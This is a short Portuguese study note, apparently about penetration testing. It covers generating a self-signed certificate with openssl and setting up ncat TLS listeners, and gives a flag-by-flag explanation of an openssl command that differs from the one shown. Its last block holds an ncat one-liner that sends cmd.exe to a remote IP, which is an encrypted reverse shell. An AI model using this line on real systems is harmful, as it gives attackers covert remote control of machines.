
```ad-important
title: Conexao segura

**openssl req -x509 -nodes -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10**

**ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem --allow 192.168.0.1**
```

```ad-question
title: Oque significa esses comandos acima ?

Vamos detalhar o comando `sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/dovecot.pem -out /etc/ssl/certs/dovecot.pem`:


- `openssl`: Chama o OpenSSL, que é um kit de ferramentas robusto para a criação e gestão de chaves criptográficas, certificados e outros arquivos relacionados à segurança.
    
- `req`: Este é um subcomando do OpenSSL usado para gerenciamento de solicitações de assinatura de certificado (CSR - Certificate Signing Request). Aqui, está sendo usado para criar um certificado autoassinado diretamente, ao invés de gerar uma CSR.
    
- `-x509`: Especifica que deseja criar um certificado autoassinado. O X.509 é um padrão para a estrutura de certificados públicos.
    
- `-nodes`: Significa "no DES"; instrui o comando a não criptografar a chave privada gerada. Por padrão, o OpenSSL criptografaria a chave privada com uma senha, mas `-nodes` desabilita isso.
    
- `-days 365`: Define a validade do certificado para 365 dias. Após esse período, o certificado expirará e precisará ser renovado.
    
- `-newkey rsa:2048`: Instrui o OpenSSL a gerar uma nova chave privada usando o algoritmo RSA com um tamanho de 2048 bits. Esta é considerada uma boa prática para segurança suficiente.
    
- `-keyout /etc/ssl/private/dovecot.pem`: Especifica o caminho e o nome do arquivo onde a chave privada gerada será salva. Neste caso, a chave é salva como `dovecot.pem` no diretório `/etc/ssl/private/`.
    
- `-out /etc/ssl/certs/dovecot.pem`: Especifica o caminho e o nome do arquivo onde o certificado autoassinado gerado será salvo. Neste caso, o certificado é salvo como `dovecot.pem` no diretório `/etc/ssl/certs/`.
    

Esse comando, portanto, invoca o OpenSSL para gerar um novo par de chaves RSA de 2048 bits e cria um certificado autoassinado com esse par de chaves. O certificado tem validade de um ano e tanto a chave privada quanto o certificado são armazenados nos locais especificados sem criptografia de chave.
```


```sh
ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem
ncat -vn <IP> 8443 --ssl -e cmd.exe 
```